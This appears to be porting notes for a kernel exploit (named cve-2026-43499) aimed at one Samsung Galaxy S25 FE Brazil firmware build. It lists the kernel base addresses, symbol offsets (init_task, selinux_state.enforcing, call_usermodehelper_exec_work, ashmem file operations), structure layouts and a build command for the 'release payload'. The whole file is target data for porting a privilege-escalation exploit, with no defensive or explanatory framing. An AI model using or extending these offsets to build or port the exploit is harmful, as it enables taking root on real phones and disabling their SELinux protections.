# Galaxy S25 FE (SM-S731B) — S731BXXU6BZDP

## Target Identity

| Field | Value |
|---|---|
| Model | SM-S731B |
| Region | ZTO (Brazil) |
| AP/PDA | S731BXXU6BZDP |
| CSC | S731BOZM6BZDP |
| CP | S731BXXS6BZE2 |
| Display Build | BP4A.251205.006.S731BXXU6BZDP |
| Fingerprint | samsung/r13sxx/essi:16/BP4A.251205.006/S731BXXU6BZDP:user/release-keys |
| Android Version | 16 (API 36) |
| Security Patch | May 2026 |

## Kernel

| Field | Value |
|---|---|
| Kernel Release | 6.1.157-android14-11 |
| KIMAGE_TEXT_BASE | 0xffffffc008000000 |
| P0_PHYS_OFFSET | 0x80000000 |
| P0_KERNEL_PHYS_LOAD | 0x80000000 |

## Symbol Offsets

| Macro | Symbol | Offset |
|---|---|---|
| CALL_USERMODEHELPER_EXEC_WORK_OFF | `call_usermodehelper_exec_work` | 0x000d4468 |
| NOOP_LLSEEK_OFF | `noop_llseek` | 0x003a1414 |
| COPY_SPLICE_READ_OFF | `generic_file_splice_read` | 0x003ef02c |
| CONFIGFS_READ_ITER_OFF | `configfs_read_iter` | 0x00470d44 |
| CONFIGFS_BIN_WRITE_ITER_OFF | `configfs_bin_write_iter` | 0x00471274 |
| ASHMEM_IOCTL_OFF | `ashmem_ioctl` | 0x00d3a19c |
| ASHMEM_COMPAT_IOCTL_OFF | `compat_ashmem_ioctl` | 0x00d3aad4 |
| ASHMEM_MMAP_OFF | `ashmem_mmap` | 0x00d3ab2c |
| ASHMEM_OPEN_OFF | `ashmem_open` | 0x00d3ad58 |
| ASHMEM_RELEASE_OFF | `ashmem_release` | 0x00d3ade0 |
| ASHMEM_SHOW_FDINFO_OFF | `ashmem_show_fdinfo` | 0x00d3af00 |
| ANON_PIPE_BUF_OPS_OFF | `anon_pipe_buf_ops` | 0x0121ced0 |
| ASHMEM_FOPS_OFF | `ashmem_fops` | 0x013d90c8 |
| KMALLOC_CACHES_OFF | `kmalloc_caches` | 0x017a7a58 |
| SYSTEM_UNBOUND_WQ_OFF | `system_unbound_wq` | 0x022eae58 |
| SLIDE_NFULNL_LOGGER_OBJECT_OFF | `nfulnl_logger` | 0x022f2a10 |
| INIT_TASK_OFF | `init_task` | 0x022ff840 |
| ASHMEM_MISC_FOPS_OFF | `ashmem_misc + 0x10` | 0x02484c30 |
| ROOT_TASK_GROUP_OFF | `root_task_group` | 0x02515cc0 |
| SELINUX_ENFORCING_OFF | `selinux_state.enforcing` | 0x025ea478 |
| SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF | `random_table[boot_id].data` | 0x023eff8 |
| SLIDE_SYSCTL_BOOTID_OFF | `sysctl_bootid` | 0x026cd5e0 |

## Slide Data

| Macro | Value |
|---|---|
| SLIDE_TRACEFS_EVENT_ID | 106 |
| SLIDE_TRACEFS_WORKER_CALLER_OFF | 0x000dbd9c |
| SLIDE_PSELECT_WORD_SHIFT | 0 |
| SLIDE_RB_PARENT_TYPE_RESTORE | 1 |

## Structure Layouts (from BTF)
sizeof(struct file_operations) = 0x110

file_operations.unlocked_ioctl = 0x50

file_operations.compat_ioctl = 0x58

file_operations.mmap = 0x60

file_operations.open = 0x70

file_operations.release = 0x80

file_operations.splice_read = 0xc8

file_operations.show_fdinfo = 0xe0

task_struct.usage = 0x40

task_struct.prio = 0x84

task_struct.normal_prio = 0x8c

task_struct.sched_task_group = 0x348

task_struct.pi_lock = 0x924

task_struct.pi_waiters = 0x938

task_struct.pi_top_task = 0x948

task_struct.pi_blocked_on = 0x950

sizeof(struct page) = 0x40

page.compound_head = 0x08

page.slab_cache = 0x18

page.page_type = 0x30


## Physical Load Address

Extracted from `sboot.bin`: Exynos 2400 loads kernel at `text_offset + 0x80000000`.
With `text_offset == 0`, `P0_KERNEL_PHYS_LOAD = 0x80000000`.

## Build

```sh
make TARGET=essi-S731BXXU6BZDP ANDROID_NDK_HOME="$NDK" release
Output: build/essi-S731BXXU6BZDP/cve-2026-43499-app.release.so (104128 bytes)

# Hardware Validation
TODO: Device-tested status pending.

## Cleanup

Retained: `kernel` (SHA256: 3b415542f39bef60b7b1f5d261d7911979567377bd6a0af241d013607bf4dfcc  kernel) (raw Image extracted from boot.img), `target.h`,
`p0_fingerprint.h`, release payload, porting notes.
Removed: firmware ZIP (`S731BXXU6BZDP_ZTO.zip`), AP tar archive,
boot/vendor images, recovered `vmlinux.elf`, `vmlinux.nm`,
`vmlinux.btf`, BTF dumps.

